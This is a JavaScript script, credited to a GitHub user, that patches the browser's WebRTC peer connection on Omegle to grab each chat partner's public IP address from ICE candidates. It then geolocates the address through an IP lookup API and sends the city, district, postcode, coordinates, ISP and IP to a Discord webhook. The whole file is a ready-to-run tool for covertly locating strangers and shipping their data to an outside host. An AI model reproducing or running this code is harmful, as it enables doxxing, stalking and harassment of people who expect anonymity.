//Omegle Javascript Discord Webhook for Geolocation information
//Created by iiferedon 
///https://github.com/iiferedon


   //EDIT THESE///
const apiKey = "IPGEOLOCATION_API_KEY_HERE";
const webhook = "DISCORD_WEBHOOK_URL_HERE"
/////


window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
    const pc = new window.oRTCPeerConnection(...args);
    pc.oaddIceCandidate = pc.addIceCandidate;
    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(" ");
        const ip = fields[4];
        if (fields[7] === "srflx") {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};

const getLocation = async (ip) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
    await fetch(url).then((response) =>
        response.json().then((json) => {
////////////////////////////WEB BROWSER//////////////////////////////////////////////////////////
            const output = `
                ---------------------------
                Country: ${json.country_name}
                State: ${json.state_prov}
                City: ${json.city}
                District: ${json.district}
                Lat / Long: (${json.latitude}, ${json.longitude})
                IP: ${json.ip}
                ISP: ${json.isp}
                Postcode: ${json.zipcode}
                ---------------------------
                `;
            console.log(output);
/////////////////////////////////DISCORD//////////////////////////////////////////////////////////
            const msg = {
                "content":`
                `,
                
                "embeds":
                [
                    {
                      "author": {
                        "name": "Omegle JavaScript Webhook",
                        "url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
                        "icon_url": "https://logodix.com/logo/37820.png"
                      },
                      "title": "Geolocation Information Received",
                      "url": "https://github.com",
                      "description": `**From**: ${json.city}, ${json.state_prov}, ${json.country_name} [View on Map](https://en.iponmap.com/${json.ip})`,
                      "color": "15258703",
                      "fields": [
                        {
                            "name": "IP Address",
                            "value": `${json.ip}`,
                            "inline": true
                        },
                        {
                            "name": "ISP",
                            "value": `${json.isp}`,
                            "inline": true
                        },
                        {
                            "name": "Country",
                            "value": `${json.country_name}`,
                            "inline": true
                        },
                        {
                            "name": "State",
                            "value": `${json.state_prov}`,
                            "inline": true
                        },
                        {
                            "name": "City",
                            "value": `${json.city}`,
                            "inline": true
                        },
                        {
                            "name": "District",
                            "value": `${json.district}`,
                        },
                        {
                            "name": "Zipcode",
                            "value": `${json.zipcode}`,
                            "inline": true
                        },
                        {
                            "name": "Longitude",
                            "value": `${json.longitude}`,
                        },
                        {
                            "name": "Latitude",
                            "value": `${json.latitude}`,
                        }
                      ],
                      "footer": {
                        "text": `Time in ${json.state_prov}: ${json.time_zone.current_time}`,
                        "icon_url": `${json.country_flag}`
                      }
                    }
                ]
            }
            fetch(webhook + "?wait=true", 
            {"method":"POST", 
            "headers": {"content-type": "application/json"},
            "body": JSON.stringify(msg)})
            .then(a=>a.json()).then(console.log)
        })
    );
};
